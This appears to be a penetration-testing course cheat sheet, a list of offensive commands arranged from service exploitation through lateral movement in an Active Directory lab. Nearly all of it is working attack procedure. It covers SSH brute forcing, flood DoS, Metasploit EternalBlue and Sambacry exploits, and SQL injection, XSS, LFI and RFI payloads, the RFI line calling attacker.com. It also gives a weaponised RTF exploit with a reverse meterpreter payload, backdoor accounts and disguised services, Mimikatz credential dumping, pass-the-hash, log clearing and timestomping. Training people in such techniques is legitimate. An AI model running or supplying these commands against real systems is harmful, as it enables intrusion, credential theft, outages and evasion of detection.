# List command - Offensive & Detection Course
List command that used in Offensive &amp; Detection Course
(If you want to view full pentest cheat sheet, please visit https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)  

# Service Exploitation
## scan network & VA
nmap -P0 <IP>  
openvas  
nessus  
  
## bruteforcing
hydra-wizard  
hydra -l root -P /usr/share/wordlists/rockyou.txt -u  -s 22  <IP> ssh  
  
## DoS
TCP(SYN Flood): hping3 -S -L -w --flood -p 80 <TARGET>  
UDP(Volume Based Attack) : hping3 --UDP --flood -p 80 <TARGET>  
  
## Sambacry
(metasploit) exploit/linux/samba/is_known_pipename  
(msf) set RHOST 192.168.210.104  
(msf) exploit  

## Eternalblue
(metasploit) exploit/windows/smb/ms17_010_eternalblue  
(msf) set RHOST 192.168.210.102  
(msf) exploit  

# Web Application Attack
## SQL Injection
') union select 1,email,password,4,5,6,7 from users;--  
## XSS
<<script>alert("XSS")</script>script>alert("XSS")<</script>/script>  
<script> window.location='http://www.google.com'</script>  
## Local File Inclusion
../../../../../../../../../../etc/passwd  
## LFI&RFI&SSRF
render.php?include=http://attacker.com  

# Document Exploit
## CVE-2017-8759
git clone https://github.com/bhdresh/CVE-2017-8759  
cd CVE-2017-8759  
python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.210.100/logo.txt  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.210.100 LPORT=4444 -f exe > /tmp/shell.exe  
msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.210.100; run"  
python cve-2017-8759_toolkit.py -M exp -e http://192.168.210.100/shell.exe -l /tmp/shell.exe  
python -m SimpleHTTPServer 8080  
## Bypassing UAC
(Metasploit) use exploit/windows/local/bypassuac  
set SESSION 1  
exploit  
getsystem  

# Lateral Movement
## normal reconnaissance
tasklist  
systeminfo  
whoami  
whoami /priv  
## Bypass UAC & Privilege Escalation
use exploit/windows/local/bypassuac  
use exploit/windows/local/bypassuac_eventvwr  
set SESSION <id>  
exploit  
## net command
net localgroup Users  
net localgroup Administrators  
net user sservice p@ssw0rd /add  
net localgroup administrators sservice /add  
net use  
net share  
net group "domain admins" /domain  
net config workstation  
net view
  
## Schtask
AT \\\REMOTECOMPUTERNAME 12:34 "command to run"  

## schtask - create new schedule task
schtasks /create /tn <taskname> /tr <taskrun> /sc <scheduleType MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE> /st <StartTime> /S <remote host> /RU <permissions of the specified user account>  
schtasks /create /tn foobar /tr c:\wiSndows\temp\foobar.exe /sc once /st 00:00 /S host /RU System  
schtasks /F /delete /tn foobar /S host  
schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System  
schtasks /run /tn foobar /S host  
delete schedule task  
schtasks /F /delete /tn foobar /S host  
## Install new service  
sc create microsoft_update binpath= "cmd /K start c:\Windows\Temp\backdoor.exe" start= auto error= ignore /c C:\Windows\Temp\backdoor.exe  
sc create Microsoft_Update binpath= "cmd /K start C:\Users\john.SECPLAYGROUND\Downloads\update.exe" start= "auto" DisplayName= "Windows Automatic updates"  
## Enable Remote Desktop  
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v AllowTSConnections /t REG_DWORD /d 1  
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0  
netsh firewall set service remoteadmin enable  
netsh firewall set service remotedesktop enable  
net start termservice  
sc config termservice start= auto  
## Mimikatz
wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip"
unzip mimikatz_trunk.zip  
(msf) upload /opt/x64/mimikatz.exe .  
(msf) upload /opt/x64/mimidrv.sys .  
(msf) upload /opt/x64/mimilib.dll .  
(msf) session -i <id>  
mimikatz.exe  
(mimikatz) privilege::debug  
(mimikatz) sekurlsa::logonPasswords full

## Pass-the-hash
git clone https://github.com/byt3bl33d3r/pth-toolkit  
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  
pth-winexe -U hash //IP cmd  
./pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' //192.168.210.102 cmd.exe  
sc query winexesvc  
sc start winexesvc  
./pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' --system //192.168.210.102 cmd.exe  
xfreerdp /u:user /d:domain /pth:hash /v:IPAddress


## WCE64.exe
/usr/share/wce  
wce64.exe  
wce64.exe -s <username>:<domain>:<lmhash>:<nthash>  


## WMIC
wmic useraccount list  
wmic useraccount list /format:list  
wmic services get name,displayname,pathname,startmode  
wmic startup list brief  
wmic share list  
wmic group list brief  
wmic process list brief  
wmic product get Name, Vendor  
wmic path win32_process call create "calc.exe"  
wmic /node:computername /user:domainname\username path win32_process call create "**empire launcher string here**"  
wmic /node:192.168.255.10 /user:"secplayground\john" path win32_process call create "calc.exe"  
wmiexec.py -debug john:P@ssw0rd@192.168.210.102  
wmiexec.py -debug -hashes xxxxxxxxxxxxxx:xxxxxxx  administrator@192.168.255.10

## Pivoting network
(meterpreter) run autoroute -s 192.168.255.0/24  
(meterpreter) run post/windows/gather/arp_scanner rhosts=192.168.255.0/24  
(meterpreter) backgroud  
(msf) use auxiliary/server/socks4a  
(msf) set SRVHOST 0.0.0.0  
(msf) set SRVPORT 9999  
(msf) exploit  
gedit /etc/proxychains.conf  
proxychains pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' --system //192.168.255.10 cmd.exe  
proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 192.168.255.10  
proxychains wmiexec.py -debug john:P@ssw0rd@192.168.255.10  

## Delete all system log
wevtutil cl security  

## Winrm
PS> Enable-PSRemoting -Force  
winrm quickconfig  

## Timestomp
(meterpreter) timestomp mimikatz.exe -v  

## crackmapexec
proxychains crackmapexec 192.168.255.10 -u john -p 'P@ssw0rd' -M mimikatz -o COMMAND=privilege::debug


# On AD
powershell "[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()"  
powershell "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"  
## Find admin user
powershell "get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf"  
## Find admin group
powershell "get-adgroup -filter {GroupCategory -eq 'Security' -AND Name -like '*admin*'}"  

# Resource::
- https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf  
- https://www.slideshare.net/votadlos/hunting-lateral-movement-in-windows-infrastructure  
- https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#net-user-domain  
- https://github.com/kmkz/Pentesting/blob/master/Pentest-cheat-sheet  
- https://www.slideshare.net/chrisgates/adversarial-simulation-nickersongates-wild-west-hacking-fest-oct-2017-81444587?qid=f71aedc6-c352-4154-bc51-3faefd5fc0ac&v=&b=&from_search=1
